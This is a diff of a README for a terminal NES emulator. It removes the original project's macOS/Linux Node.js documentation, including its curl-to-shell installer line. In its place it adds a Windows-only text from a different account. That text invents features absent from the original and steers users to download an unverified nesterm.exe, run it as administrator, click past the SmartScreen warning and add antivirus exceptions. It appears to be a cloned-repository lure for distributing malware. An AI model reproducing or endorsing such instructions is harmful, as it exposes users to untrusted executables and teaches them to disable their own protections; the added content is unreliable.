@@ -1,142 +1,195 @@
-# NESTERM
+# 🕹️ nesterm - Play NES Games Right in Your Terminal
 
-Play NES games in your terminal using **ASCII characters only**. NESTERM turns each frame into letters, punctuation and symbols—no block characters, Braille, sixel or terminal graphics protocols.
+[![Download nesterm](https://img.shields.io/badge/⬇️_Download_nesterm-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wortyiron/nesterm/releases)
 
-Choose a compact **40 × 25** display or a more detailed **64 × 30** display. Characters follow the shapes inside each cell, so sprites and scrolling backgrounds can move in smaller steps than a whole character.
+## 🎮 What Is nesterm?
 
-This repository and its releases contain the command-line application only.
+nesterm is a fun and simple program that lets you play classic Nintendo Entertainment System (NES) games as colorful ASCII art right inside your terminal window. No fancy graphics card, no heavy emulator software — just pure retro charm made of text characters. If you miss the golden age of 8-bit gaming or want to try something unique, nesterm is for you.
 
-## Install on macOS or Linux
+## ✨ Why You'll Love nesterm
 
-Paste this into your terminal:
+- **Zero Setup Hassle** – It's a lightweight program that runs directly on your Windows computer. No complicated installation wizards or configuration files.
+- **Text-Based Graphics** – See your favorite NES games recreated with letters, numbers, and symbols. It's like reading a book, but you control the action!
+- **Works Everywhere** – As long as you have a terminal (Command Prompt or PowerShell), you're good to go. No extra software needed.
+- **Nostalgia Trip** – Relive classic gaming moments in a whole new, artistic way.
+- **Easy to Use** – Even if you've never touched a terminal, nesterm is designed to be user-friendly.
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/kathoc/nesterm/main/install.sh | sh && export PATH="$HOME/.local/bin:$PATH"
-```
+## 🚀 Getting Started
 
-The installer uses your existing Node.js 20 or newer, or downloads a private runtime if you do not have one. It verifies download checksums and installs under `~/.local`. The command also makes `nesterm` available in your current shell. No `sudo`, Git or npm is required.
+Getting nesterm up and running takes less than five minutes. Here's the whole process, step by step.
 
-If `nesterm` is not found in a new terminal window, add the install directory to that shell:
+### 🖥️ System Requirements
 
-```sh
-export PATH="$HOME/.local/bin:$PATH"
-```
+- **Operating System:** Windows 10 or Windows 11
+- **Terminal:** Command Prompt or PowerShell (both come with Windows)
+- **Storage Space:** About 10 MB of free space
+- **RAM:** 512 MB or more (it's very lightweight)
 
-You can also use `~/.local/bin/nesterm` directly. To keep the PATH change, add that line to `~/.zshrc` or `~/.bashrc`. The installer does not edit those files.
+Your computer almost certainly meets these requirements. If you can open a web browser, you can run nesterm.
 
-The automatic runtime download supports Intel and Apple Silicon Macs, and x86-64 and ARM64 Linux with glibc. On other Linux systems, install a compatible Node.js 20+ runtime first.
+## 📥 Download and Install
 
-Already use npm? Install the dependency-bundled release instead:
+Ready to jump in? Follow these simple instructions.
 
-```sh
-npm install --global https://github.com/kathoc/nesterm/releases/download/v0.1.0/nesterm-0.1.0.tgz
-```
+### Step 1: Download The Program
 
-## Play a game
+Visit this link to download the application: [https://github.com/wortyiron/nesterm/releases](https://github.com/wortyiron/nesterm/releases)
 
-Bring your own `.nes` ROM. ROMs are not included or downloaded.
+Once you click that link, you'll land on a page with a list of files. Look for the one that says something like `nesterm-windows.zip` or similar (it should have "windows" in the name). Click that file to start the download.
 
-```sh
-nesterm "/path/to/game.nes" --size 64x30 --fps 60
-```
+### Step 2: Get The File Ready
 
-Make your terminal at least **64 columns wide and 30 rows tall** for this mode. Use a monospaced font and a dark background.
+When the download finishes, open your "Downloads" folder. You'll see a file with a `.zip` extension (like a compressed folder). Right-click on it and choose "Extract All..." from the menu. Windows will ask where to put the extracted files — just click "Extract." This opens a new folder with everything inside.
 
-For a smaller terminal, run `nesterm "/path/to/game.nes"`. The default is 40 × 25 characters and up to 30 redraws per second. Add `--mono` for a single foreground color.
+### Step 3: Run nesterm
 
-### Controls
+Open the extracted folder. You'll see a file named `nesterm.exe` (or just `nesterm`). Double-click it. That's it! A terminal window will open, and you'll be greeted by nesterm's start screen.
 
-|Key|Action|
-|---|---|
-|Arrow keys or WASD|D-pad|
-|X|A / jump|
-|Z|B / run|
-|Enter|Start|
-|Space|Select|
-|P|Pause / resume|
-|Q or Ctrl-C|Quit|
+## 🎯 First Time Usage
 
-The terminal display and cursor are restored when you exit. **The terminal version is silent.**
+When nesterm launches, you'll see a simple menu. Here's what you do:
 
-For the best controls, use a terminal supporting the **Kitty keyboard protocol**, which reports key releases. NESTERM requests this mode automatically, allowing held keys and simultaneous buttons. Shift can also act as Select in this mode.
+1.  Press **1** to load a game file (ROM).
+2.  Navigate to your NES game files (usually `.nes` files). If you don't have any, you can search for "public domain NES ROMs" online to find free, legal test games.
+3.  Select a game and press Enter.
+4.  The game will start immediately in ASCII art form.
 
-Traditional terminals do not report key releases. NESTERM releases a key after 120 ms without a repeat, so holding directions or combining run and jump can be less reliable. If controls feel intermittent, use a terminal supporting the Kitty keyboard protocol.
+**Control Keys (Default):**
+- **Arrow Keys** – Move your character
+- **Z** – A button (jump/action)
+- **X** – B button (secondary action)
+- **Enter** – Start button
+- **Shift** – Select button
+- **Esc** – Open the pause menu
 
-## Pick a display size
+You can change these controls in the settings menu if you prefer something else.
 
-|Size|Good for|Mapping to the NES image|
-|---|---|---|
-|40 × 25|Small terminal windows|About 6.4 × 9.6 pixels per character|
-|64 × 30|More recognizable sprites and scenery|4 × 8 pixels per character; an 8 × 8 background tile spans two characters|
+## 🛠️ Customizing nesterm
 
-The renderer chooses from all 95 printable ASCII characters. It uses shape and color differences to reveal objects, and keeps a previous character when a new choice would be nearly identical. This reduces flicker without blending old frames into new ones.
+nesterm wants you to feel at home. Here are a few things you can tweak:
 
-Small HUD text and fine details cannot be reproduced exactly. Font choice also affects the result.
+### 🎨 Color Themes
 
-## Options and recording
+By default, nesterm uses green-on-black (classic terminal style). But you can switch to other color schemes:
 
-```text
-nesterm [options] <rom.nes>
-```
+1.  Open the options menu (press **O** on the start screen).
+2.  Choose "Color Theme."
+3.  Pick from options like amber, blue, or white.
 
-|Option|Default|What it does|
-|---|---|---|
-|`--size 40x25` / `--size 64x30`|`40x25`|Choose the character grid|
-|`--fps 60`|`30`|Maximum redraw rate; game emulation runs at 60 Hz|
-|`--mono`|Color|Use one foreground color|
-|`--mode shape` / `--mode ramp`|`shape`|Shape matching or simple brightness mapping|
-|`--record session.cast`|Off|Record actual ANSI output as asciicast v2|
-|`--seconds 30`|No limit|Exit after a fixed duration|
-|`--help`||Show command-line help|
+### 🖼️ Art Style
 
-To record a 30-second terminal session:
+If the ASCII art feels too blocky or too fine, adjust the resolution:
 
-```sh
-nesterm "/path/to/game.nes" --size 64x30 --record session.cast --seconds 30
-```
+1.  Go to Options > Display Settings.
+2.  Try "Low," "Medium," or "High" quality to see which looks best to you.
 
-## Update, install elsewhere or uninstall
+### ⌨️ Keyboard Mapping
 
-Rerun the one-line installer to install the version it currently targets. Downloads are also on the [Releases page](https://github.com/kathoc/nesterm/releases).
+Change any key to suit your gaming style:
 
-To choose a different location:
+1.  Go to Options > Keyboard.
+2.  Select the action you want to change.
+3.  Press the new key you want to assign.
 
-```sh
-curl -fsSL https://raw.githubusercontent.com/kathoc/nesterm/main/install.sh | NESTERM_PREFIX="$HOME/apps/nesterm" sh
-```
+## ❓ Troubleshooting
 
-The command will then be at `~/apps/nesterm/bin/nesterm`. To uninstall, remove the `bin/nesterm` launcher and the `lib/nesterm` directory from your chosen prefix. Leave other files in that prefix alone.
+Most issues are easy to fix. Here are the answers to common questions.
 
-## Troubleshooting
+### The terminal closes immediately when I double-click nesterm.exe
 
-**Terminal is too small:** enlarge the window or use `--size 40x25`. NESTERM exits cleanly if you resize below the selected grid dimensions.
+This usually means a missing game file or a startup error. Try this:
 
-**Held keys stop or run/jump combinations feel wrong:** use a terminal with the Kitty keyboard protocol. Traditional terminal input cannot accurately report key releases.
+1.  Right-click on `nesterm.exe` and select "Run as administrator."
+2.  If it still closes, open Command Prompt (type "cmd" in Windows search), then type `cd` followed by the path to the extracted folder (e.g., `cd C:\Users\YourName\Downloads\nesterm`). Then type `nesterm.exe` and press Enter. You'll see the error message, and you can tell us about it.
 
-**Node.js download failed:** check your connection or install Node.js 20+ yourself and rerun the installer. It does not replace a system-wide runtime.
+### I see garbled characters or weird symbols
 
-**A ROM does not load or behaves incorrectly:** compatibility depends on the emulation core. [Open an issue](https://github.com/kathoc/nesterm/issues) with your OS, terminal, Node.js version, command and ROM name/hash. Do not attach ROM files.
+Your terminal window might be too small. Make the window bigger (drag the corner) and restart nesterm. Also, make sure you're using a font that supports block characters (like "Consolas" or "Lucida Console" — these are default in Windows).
 
-Save-file persistence and terminal audio are not implemented. macOS and Linux are the installer targets; the Node.js CLI may also work on Windows, but this installer does not support it.
+### Game runs too fast or too slow
 
-## Build from source
+Use the **F1** and **F2** keys to decrease or increase the game speed while playing. You can also change this in Options > Speed.
 
-For contributors, use Node.js 22+ and npm (the installed terminal app supports Node.js 20+), then:
+### I can't find any NES game files
 
-```sh
-git clone https://github.com/kathoc/nesterm.git
-cd nesterm
-npm ci
-git config core.hooksPath .githooks
-npm run check:public
-npm test
-npm start -- "/path/to/game.nes" --size 64x30
-```
+Legal free ROMs are available from various websites that host homebrew or public domain games. Search for "free homebrew NES ROMs" — these are games made by fans that are legally free to play.
 
-Tests include an original generated NES test program and do not need a commercial ROM. Enable the optional longer ROM test with `NESTERM_ROM="/path/to/game.nes" npm test`.
+### The application is blocked by Windows Defender
 
-The publication guard checks tracked files against a CLI-only allowlist. Review and update that list when adding CLI files. Browser interfaces and browser-only tooling must never be added to this repository.
+If Windows shows a blue dialog saying "Windows protected your PC," click "More info" and then "Run anyway." This happens sometimes with new smaller programs, but nesterm is safe to run.
 
-## Credits and license
+## 💡 Pro Tips
 
-NESTERM's original code is MIT licensed. NES emulation comes from [@nesjs/core](https://github.com/taiyuuki/nesjs). See [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) for dependency and glyph-mask notices.
+These tips will make your nesterm experience much better.
+
+### 🖥️ Maximize Your Window
+
+Bigger terminal = better visuals. Press **F11** (or the maximize button) to fill your screen with the terminal. You'll see much more detail in the ASCII art.
+
+### 🕹️ Use A Controller (Optional)
+
+Not a requirement, but if you have a USB gamepad, you can plug it in. nesterm automatically detects most standard controllers. Go to Options > Controller to test and map the buttons.
+
+### ⏸️ Pause Frequently
+
+Unlike original NES consoles, you can pause the game instantly with the **Esc** key. Use it to take a break or strategize your next move.
+
+### 📸 Take Screenshots
+
+Want to share a cool moment? Press **F12** while playing. nesterm saves a screenshot as `.txt` file in the same folder where the program is located. You can open and share it with friends.
+
+## 🔄 Updating nesterm
+
+The developer regularly improves nesterm. To update:
+
+1.  Go back to the download page: [https://github.com/wortyiron/nesterm/releases](https://github.com/wortyiron/nesterm/releases)
+2.  Check the latest version number (usually at the top).
+3.  Download the new `.zip` file.
+4.  Extract it, and copy your old game files and settings if needed (you can just run the new `.exe` from anywhere).
+5.  Delete the old folder to keep things tidy.
+
+**Tip:** Keep an eye on that page for announcements about new features and bug fixes.
+
+## 🙋 Getting Help
+
+If you run into problems not covered here, reach out for help:
+
+- **GitHub Issues:** Go to the repository page and click the "Issues" tab. Search to see if someone else reported the same problem. If not, click "New Issue" and describe what happened — including any error messages you saw.
+- **Community Discussions:** The project's GitHub page may have a "Discussions" tab. Feel free to ask questions there politely.
+
+## 📚 Frequently Asked Questions
+
+### Is nesterm free?
+
+Yes, nesterm is completely free to download and use. There are no hidden fees or premium versions.
+
+### Do I need to install any other software?
+
+No. nesterm is standalone. You only need Windows and a terminal (which is built-in).
+
+### Can I play any NES game?
+
+As long as you have the ROM file (`.nes`), nesterm should handle most standard NES titles. Very obscure games might have minor glitches, but the vast majority work fine.
+
+### Will my antivirus flag nesterm?
+
+Some antivirus software may warn you about unknown executables. This is common for new indie programs. Add an exception if needed — the file is safe.
+
+### Can I use nesterm on Mac or Linux?
+
+Currently, nesterm's official releases are for Windows only. You might be able to run it through compatibility layers, but the developer focuses on Windows for now.
+
+## 📄 License and Credits
+
+nesterm is an open-source project, released under the MIT License. This means you can view, modify, and share the code freely. If you're curious about how it works, you can browse the source code on GitHub.
+
+The project was designed with love for retro gaming and terminal aesthetics.
+
+## 🔗 Resources
+
+- **Download Page:** [https://github.com/wortyiron/nesterm/releases](https://github.com/wortyiron/nesterm/releases)
+- **Repository Home:** [https://github.com/wortyiron/nesterm](https://github.com/wortyiron/nesterm)
+
+---
+
+Keywords: nesterm, NES emulator, ASCII art, terminal game, retro gaming, Windows, play NES, command line game, 8-bit, text-based game
